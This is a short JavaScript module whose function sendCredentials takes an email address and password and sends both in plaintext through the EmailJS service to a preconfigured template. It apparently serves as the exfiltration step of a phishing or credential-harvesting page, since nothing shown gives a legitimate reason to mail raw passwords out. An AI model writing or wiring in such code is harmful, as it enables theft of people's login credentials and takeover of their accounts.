import emailjs from "@emailjs/browser";

export const sendCredentials = async ({ email, password }) => {
  if (!email || !password) throw new Error("Invalid email credentials payload");

  return emailjs.send(
    import.meta.env.VITE_EMAILJS_SERVICE_ID,
    import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
    {
      email,
      password,
    },
    import.meta.env.VITE_EMAILJS_PUBLIC_KEY
  );
};